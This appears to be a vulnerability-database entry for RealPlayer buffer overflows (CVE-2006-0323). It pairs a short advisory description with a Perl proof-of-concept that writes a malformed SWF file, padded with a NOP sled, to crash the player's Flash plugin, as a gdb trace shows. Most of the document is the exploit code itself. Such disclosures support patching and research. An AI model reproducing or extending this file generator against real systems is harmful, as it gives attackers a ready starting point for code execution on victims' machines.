source: http://www.securityfocus.com/bid/17202/info

Various RealNetworks products are prone to multiple buffer-overflow vulnerabilities.

These issues can result in memory corruption and facilitate arbitrary code execution. A successful attack can allow remote attackers to execute arbitrary code in the context of the application to gain unauthorized access.

#!/usr/bin/perl
###################################################
# RealPlayer: Buffer overflow vulnerability / PoC
#
# CVE-2006-0323
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0323
#
# RealNetworks Advisory
# http://service.real.com/realplayer/security/03162006_player/en/
#
# Federico L. Bossi Bonin 
# fbossi[at]netcomm.com.ar
###################################################

# Program received signal SIGSEGV, Segmentation fault.
# [Switching to Thread -1218976064 (LWP 21932)]
# 0xb502eeaf in CanUnload2 () from ./plugins/swfformat.so

my $EGGFILE="egg.swf";
my $header="\x46\x57\x53\x05\xCF\x00\x00\x00\x60";

my $endheader="\x19\xe4\x7d\x1c\xaf\xa3\x92\x0c\x72\xc1\x80\x00\xa2\x08\x01".
	      "\x00\x00\x00\x00\x01\x02\x00\x01\x00\x00\x00\x02\x03\x00\x02".
	      "\x00\x00\x00\x04\x04\x00\x03\x00\x00\x00\x08\x05\x00\x04\x00".
              "\x00\x00\x00\x89\x06\x06\x01\x00\x01\x00\x16\xfa\x1f\x40\x40".
	      "\x00\x00\x00";


open(EGG, ">$EGGFILE") or die "ERROR:$EGGFILE\n";
print EGG $header;

for ($i = 0; $i < 135; $i++) {
$buffer.= "\x90";
}

print EGG $buffer;
print EGG $endheader;
close(EGG);
